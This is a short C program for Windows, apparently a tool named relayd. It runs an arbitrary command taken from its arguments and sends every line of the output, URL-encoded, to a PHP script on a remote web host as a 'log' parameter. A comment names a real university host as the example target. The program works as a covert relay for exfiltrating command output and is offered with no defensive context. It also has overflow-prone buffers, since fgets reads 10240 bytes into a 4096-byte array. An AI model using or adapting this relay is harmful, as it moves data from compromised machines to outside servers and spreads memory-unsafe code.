#include <stdio.h>
#include <string.h>
//#include <sys/types.h>
//#include <sys/socket.h>
//#include <netinet/in.h>
#include <winsock2.h>
/*
Try:
relayd.exe scnmc.hs.ntnu.edu.tw /bra.php dir /b
*/
int htconnect(char *host)
{
int white_sock;
struct hostent *site;
struct sockaddr_in me;
int port = 80;
site = gethostbyname(host);
if ( site == NULL ){
printf("Error:%d\n",WSAGetLastError());
return -2;
}

white_sock = socket(AF_INET,SOCK_STREAM,0);
if ( white_sock < 0 ){
return -1 ;
}
memset(&me,0,sizeof(struct sockaddr_in));
memcpy(&me.sin_addr,site->h_addr_list[0],site->h_length);
me.sin_family = AF_INET;
me.sin_port = htons(port);

return (connect(white_sock,(struct sockaddr *)&me,sizeof(struct sockaddr)) < 0 )?-1:white_sock;
}

void urlencode(unsigned char *s, unsigned char *t) {
	unsigned char *p, *tp;
	if(t == NULL) {
		fprintf(stderr, "Serious memory error...\n");
		exit(1);
	}
	tp=t;
	for(p=s; *p; p++) {
		if((*p > 0x00 && *p < ',') || (*p > '9' && *p < 'A') || (*p > 'Z' && *p < '_') || (*p > '_' && *p < 'a') || (*p > 'z' && *p < 0xA1)){
			sprintf(tp, "%%%02X", *p);
			tp += 3;
		}else{
			*tp = *p;
			tp++;
		}
	}
	*tp='\0';
	return;
}

int main(int ac, unsigned char **av){
	unsigned char cmd[2048],linein[4096],buf[4096],url[4096],*ptr;
	int i,j,len,pos=0,black_sock;
	FILE *pipe;
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0) {
		return;
	}
	for(i=3;i<ac;i++){
		len=strlen(av[i]);
		for(j=0;j<len;j++){
			cmd[pos++]=av[i][j];
		}
		cmd[pos++]=' ';
	}
	cmd[pos]='\0';
	pipe=popen(cmd,"r");
	while(fgets(linein,10240,pipe)){
		printf("%s",linein);
		ptr=url;
		strcpy(ptr,"GET ");
		ptr+=strlen(ptr);
		strcpy(ptr,av[2]);
		ptr+=strlen(ptr);
		strcpy(ptr,"?log=");
		ptr+=strlen(ptr);
		urlencode(linein,buf);
		strcpy(ptr,buf);
		ptr+=strlen(ptr);
		strcpy(ptr,"\r\n\r\n");
//		printf("%s",url);
		black_sock = htconnect(av[1]);
		if (black_sock < 0){
			printf("Error:%d\n",WSAGetLastError());
		}
		send(black_sock,url,200,0);
	}
	pclose(pipe);
	WSACleanup();
}
